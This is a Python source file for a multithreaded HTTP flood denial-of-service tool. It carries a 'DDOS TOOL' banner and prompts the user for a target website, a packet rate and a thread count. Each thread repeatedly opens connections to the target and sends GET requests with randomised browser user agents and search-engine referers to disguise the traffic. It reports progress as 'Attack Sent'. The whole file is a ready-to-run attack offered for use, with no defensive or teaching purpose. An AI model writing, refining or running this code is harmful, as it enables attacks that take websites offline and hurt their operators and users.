import os
import socket
import random
import threading
import time
import sys
import re
from urllib.parse import urlparse


useragents = [
    'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
    'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
    'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2',
    'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
    'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3'
]


ref = [
    'http://www.bing.com/search?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://duckduckgo.com/?q='
]


acceptall = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n'
]


logo ='''
\033[1;39m
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚══════╝ ╚══════╝
\033[0m
\033[1;34m═══════════════════════════════════════════
\033[1;36m          𝑫𝑫𝑶𝑺 𝑻𝑶𝑶𝑳
\033[1;34m═══════════════════════════════════════════
\033[1;91m[🛡️] Owner    : 𝑨𝑹𝑰𝒀𝑨𝑵 𝑺𝑰𝑨𝑴
\033[1;33m[🛡️] Facebook : 𝑨𝑹𝑰𝒀𝑨𝑵 𝑺𝑰𝑨𝑴
\033[1;35m[🛡️] GitHub   : 𝑨𝑹𝑰𝒀𝑨𝑵-𝑺𝑰𝑨𝑴
\033[1;32m[🛡️] Team     : 𝑾𝑯𝑰𝑻𝑬 𝑯𝑨𝑻 𝑩𝑫
                  𝑪𝒀𝑩𝑬𝑹 𝑺𝑯𝑰𝑬𝑳𝑫
\033[1;34m═══════════════════════════════════════════\033[0m
'''

def extract_domain(url):
    
    
    url = url.lower().strip()
    
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    
    parsed = urlparse(url)
    domain = parsed.netloc or parsed.path
    
    
    domain = domain.replace('www.', '')
    
    
    if ':' in domain:
        domain = domain.split(':')[0]
    
    return domain, parsed.scheme

def get_port_from_url(url):
    if url.startswith('https://'):
        return 443
    else:
        return 80


def start():
    try:
        
        hh = random._urandom(16)
        xx = 0
        
        
        useragen = 'User-Agent: ' + random.choice(useragents) + '\r\n'
        accept = random.choice(acceptall)
        reffer = 'Referer: ' + random.choice(ref) + '\r\n'
        content = 'Content-Type: application/x-www-form-urlencoded\r\n'
        length = 'Content-Length: 0\r\nConnection: Keep-Alive\r\n'
        
        
        target_host = f'GET / HTTP/1.1\r\nHost: {target_ip}\r\n'
        main_req = target_host + useragen + accept + reffer + content + length + '\r\n'
        
        packet_count = 0
        
        while True:
            try:
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                
                s.connect((target_ip, target_port))
                
                
                for _ in range(packet_rate):
                    s.send(main_req.encode('utf-8', errors='ignore'))
                    packet_count += 1
                    
                s.close()
                
                
                print(f'\033[0m[🔥] Attack Sent to {target_url} | Packets: {packet_count}\033[0m')
                
            except socket.timeout:
                print(f'\033[1;33m[⏰] Connection Timeout - Retrying...\033[0m')
                time.sleep(1)
                
            except ConnectionRefusedError:
                print(f'\033[1;31m[👽] Connection Refused - Server might be down\033[0m')
                time.sleep(2)
                
            except Exception as e:
                print(f'\033[1;31m[👽] Server Processing...\033[0m')
                try:
                    s.close()
                except:
                    pass
                time.sleep(1)
                
    except Exception as e:
        print(f'\033[1;31m[!] Thread Error: {e}\033[0m')


if __name__ == "__main__":
    try:
        
        os.system('clear')
        
        
        print(logo)
        
        
        target_url = input('\033[1;36m[🌐] Target Website URL ➔ \033[0m')
        
        
        target_ip, protocol = extract_domain(target_url)
        
        
        try:
            target_ip = socket.gethostbyname(target_ip)
        except socket.gaierror:
            print('\033[1;31m[!] Invalid Domain or Website Not Found!\033[0m')
            sys.exit(1)
        
        
        target_port = 443 if protocol == 'https' else 80
        
        
        packet_rate = int(input('\033[1;36m[⚡] Packets/Second ➔ \033[0m'))
        
        
        thread_count = int(input('\033[1;36m[🧵] Number of Threads ➔ \033[0m'))
        
        print(f'\n\033[1;33m[!] Attack Configuration:\033[0m')
        print(f'\033[1;32m    Target URL   : {target_url}\033[0m')
        print(f'\033[1;32m    Target IP    : {target_ip}\033[0m')
        print(f'\033[1;32m    Target Port  : {target_port}\033[0m')
        print(f'\033[1;32m    Packets/Sec  : {packet_rate}\033[0m')
        print(f'\033[1;32m    Threads      : {thread_count}\033[0m')
        print(f'\n\033[1;33m[!] Attack Started... Press Ctrl+C to Stop\033[0m\n')
        
        
        time.sleep(2)
        
        
        for x in range(thread_count):
            thred = threading.Thread(target=start)
            thred.daemon = True
            thred.start()
        
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print('\n\n\033[1;31m[!] Attack Stopped \033[0m')
        print('\033[1;33m[!] Thank you for using 𝑨𝑹𝑰𝒀𝑨𝑵 𝑺𝑰𝑨𝑴 \033[0m')
        sys.exit(0)
        
    except ValueError as e:
        print(f'\033[1;31m[!] Invalid Input: Please enter numbers only\033[0m')
        sys.exit(1)
        
    except Exception as e:
        print(f'\033[1;31m[!] Error: {e}\033[0m')
        sys.exit(1)